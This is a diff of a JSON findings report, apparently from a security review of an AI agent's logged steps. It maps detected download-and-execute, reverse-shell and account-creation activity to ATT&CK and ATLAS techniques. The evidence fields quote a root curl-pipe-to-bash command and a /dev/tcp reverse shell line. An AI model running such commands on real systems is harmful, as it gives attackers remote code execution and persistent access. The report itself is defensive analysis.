@@ -956,7 +956,7 @@
     "basis": "ShellDownloadAndExecute, ReverseShell",
     "files": "20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attack": "T1059.004, T1105, T1095",
-    "atlas": "AML.T0072, AML.T0050",
+    "atlas": "AML.T0050, AML.T0072",
     "targets": "url http://203.0.113.40/s.sh; host 203.0.113.41 ($H); port $PORT",
     "evidence": "ShellDownloadAndExecute: sudo bash -c \"$(curl -fsSL http://203.0.113.40/s.sh)\" (20261022_092500_step06_stage.sh:4)\nReverseShell: os.system(\"exec 3<>/dev/tcp/$H/$PORT\") (20261022_093000_step07_channel.py:8)",
     "exposed": null
@@ -995,7 +995,7 @@
     "basis": "ShellDownloadAndExecute",
     "files": "20261022_092500_step06_stage.sh",
     "attack": "T1059.004, T1105",
-    "atlas": "AML.T0072, AML.T0050",
+    "atlas": "AML.T0050, AML.T0072",
     "targets": "url http://203.0.113.40/s.sh",
     "evidence": "ShellDownloadAndExecute: sudo bash -c \"$(curl -fsSL http://203.0.113.40/s.sh)\" (20261022_092500_step06_stage.sh:4)",
     "exposed": null
@@ -1512,11 +1512,11 @@
     "section": "mitigation",
     "value": "high",
     "detail": "Organizations should control external resources created or acquired by AI agents during execution by treating those resources as attributable, lifecycle-managed assets.",
-    "basis": "ShellDownloadAndExecute, AccountCreation",
-    "files": "20261022_091500_step04_persist.sh, 20261022_092500_step06_stage.sh, audit_20261022_093500.jsonl",
+    "basis": "ShellDownloadAndExecute, ReverseShell, AccountCreation",
+    "files": "20261022_091500_step04_persist.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py, audit_20261022_093500.jsonl",
     "attack": null,
     "atlas": "AML.T0072, AML.T0125",
-    "targets": "ShellDownloadAndExecute: url http://203.0.113.40/s.sh; AccountCreation: account svc",
+    "targets": "ShellDownloadAndExecute: url http://203.0.113.40/s.sh; ReverseShell: host 203.0.113.41 ($H), port $PORT; AccountCreation: account svc",
     "evidence": null,
     "exposed": "username: svc"
   },
